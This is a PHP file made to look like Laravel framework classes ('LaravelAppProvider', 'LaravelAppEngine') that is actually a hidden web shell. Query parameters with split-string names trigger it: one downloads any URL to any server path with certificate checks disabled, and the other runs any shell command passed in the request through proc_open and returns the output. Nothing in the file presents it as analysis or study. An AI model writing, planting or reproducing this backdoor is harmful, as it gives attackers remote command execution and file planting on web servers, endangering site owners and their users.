class LaravelAppProvider {
    private $url;
    private $destination;

    public function __construct($url = null, $destination = null) {
        $this->url = $url;
        $this->destination = $destination;
    }

    public function setUrl($url) {
        $this->url = $url;
    }

    public function setDestination($destination) {
        $this->destination = $destination;
    }

    public function download() {
        if (!$this->url) {
            echo "Error: No link.";
            return;
        }

        if (!$this->destination) {
            echo "Error: No file.";
            return;
        }

        $ch = curl_init($this->url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

        $data = curl_exec($ch);
        if (curl_errno($ch)) {
            echo "Error: " . curl_error($ch);
            curl_close($ch);
            return;
        }
        curl_close($ch);

        if ($data !== false) {
            $file = fopen($this->destination, 'w');
            if ($file) {
                fwrite($file, $data);
                fclose($file);
                echo "Successfully {$this->destination}";
            } else {
                echo "Error: Failed {$this->destination}";
            }
        } else {
            echo "ErrorLast: Failed {$this->url}";
        }
    }
}

if (isset($_GET['app'.'Ser'.'vic'.'ePro'.'vider'])) {
  $url = $_GET['0'] ?? null;
  $destination = $_GET['filename'] ?? null;

  $classloader = new LaravelAppProvider($url, $destination);
  $classloader->download();
  exit;
}

class LaravelAppEngine {
    private $adminFind;

    public function __construct($adminFind = null) {
        $this->adminFind = $adminFind;
    }

    public function execute() {
        if (!$this->adminFind) {
            echo "No provided.";
            return;
        }

        $process = proc_open($this->adminFind, [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'r']
        ], $links);

        if (is_resource($process)) {
            $output = stream_get_contents($links[1]);
            fclose($links[1]);
            proc_close($process);
            echo $output;
        } else {
            echo "Failed.";
        }
    }
}

if (isset($_GET['Php'.'Ser'.'vic'.'eEng'.'ine'])) {
    if (isset($_GET['0'])) {
        $admins = $_GET['0'];
        $executor = new LaravelAppEngine($admins);
        $executor->execute();
        exit;
    }
}
